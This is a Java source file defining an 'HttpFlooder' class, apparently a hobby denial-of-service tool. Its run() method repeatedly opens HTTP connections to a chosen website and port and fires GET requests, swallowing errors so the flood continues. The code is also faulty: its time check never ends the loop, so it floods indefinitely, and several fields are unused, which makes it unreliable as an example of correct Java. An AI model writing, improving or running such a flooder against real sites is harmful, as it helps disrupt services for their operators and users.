

/**
 * Created by ryan on 11/14/14.
 */


import org.apache.http.HttpHost;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.*;
import java.util.Random;


public class HttpFlooder implements Runnable {
    final int THREADS = 5;
    final String USER_AGENT = "Mozilla/5.0";
    String website;
  //  String request = "\"GET HTTP/1.1\"\n Host: ";
    int port, timeLength;
    long startTime;
    URL url;
    HttpURLConnection connection;

    PrintWriter wr;
    HttpHost host;
    Random random = new Random();

    public HttpFlooder(String website, int port, int secTime) {
        this.port = port;
        this.website = website;
        this.timeLength = secTime;
        startTime = System.currentTimeMillis();
     
    }

    public void run() {
        HttpURLConnection conn;
        int errors = 0;
        String date;
        while (startTime - System.currentTimeMillis() < (timeLength * 1000)) {
            try {
                if(!website.contains("http"))
                    conn = (HttpURLConnection)(new URL("http://"+website+":"+port)).openConnection();
                   else  conn= (HttpURLConnection) (new URL(website+":"+port)).openConnection();
                    HttpURLConnection.setFollowRedirects(false);

				conn.setRequestMethod("GET");
				conn.getResponseCode();
                String temp;
                conn=null;


            }

            catch (IOException e) {
                String[] error=new String[]{"IOException in: "+getClass().getName() };
                new Thread(new MyException(e, error)).start();
                continue;

            }

            }
        }
    }
